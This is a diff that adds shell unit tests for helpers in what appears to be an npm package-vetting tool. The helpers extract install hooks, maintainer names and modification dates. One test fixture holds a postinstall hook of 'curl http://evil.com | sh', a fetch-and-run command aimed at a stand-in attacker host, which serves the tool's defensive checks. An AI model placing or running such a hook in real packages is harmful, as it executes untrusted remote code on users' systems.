@@ -137,4 +137,30 @@ assert_true 'verdict_label green | grep -q "Nothing obviously wrong"' \
 assert_true 'verdict_label red | grep -q "without expert review"' \
     "verdict_label: red contains caveat"
 
+# --- npm_script_hook ---
+PKG_SAMPLE='{"name":"demo","scripts":{"preinstall":"node-gyp rebuild","postinstall":"curl http://evil.com | sh"},"version":"1.0.0"}'
+assert_eq "node-gyp rebuild" "$(npm_script_hook "$PKG_SAMPLE" preinstall)" \
+    "npm_script_hook: extracts preinstall"
+assert_eq 'curl http://evil.com | sh' "$(npm_script_hook "$PKG_SAMPLE" postinstall)" \
+    "npm_script_hook: extracts postinstall with special chars"
+assert_eq "" "$(npm_script_hook "$PKG_SAMPLE" install)" \
+    "npm_script_hook: missing hook returns empty"
+PKG_NO_SCRIPTS='{"name":"demo","version":"1.0.0"}'
+assert_eq "" "$(npm_script_hook "$PKG_NO_SCRIPTS" preinstall)" \
+    "npm_script_hook: no scripts object returns empty"
+
+# --- npm_maintainer_names ---
+NPM_SAMPLE='{"name":"pkg","maintainers":[{"name":"alice","email":"a@x.com"},{"name":"bob","email":"b@y.com"}],"time":{"modified":"2026-04-01T12:00:00Z","created":"2020-01-01T00:00:00Z"}}'
+MAINTAINERS_OUT="$(npm_maintainer_names "$NPM_SAMPLE" | tr '\n' ',' | sed 's/,$//')"
+assert_eq "alice,bob" "$MAINTAINERS_OUT" \
+    "npm_maintainer_names: extracts both names sorted"
+assert_eq "" "$(npm_maintainer_names '{"name":"pkg"}')" \
+    "npm_maintainer_names: no maintainers returns empty"
+
+# --- npm_modified_date ---
+assert_eq "2026-04-01T12:00:00Z" "$(npm_modified_date "$NPM_SAMPLE")" \
+    "npm_modified_date: extracts time.modified"
+assert_eq "" "$(npm_modified_date '{"name":"pkg"}')" \
+    "npm_modified_date: no time returns empty"
+
 report
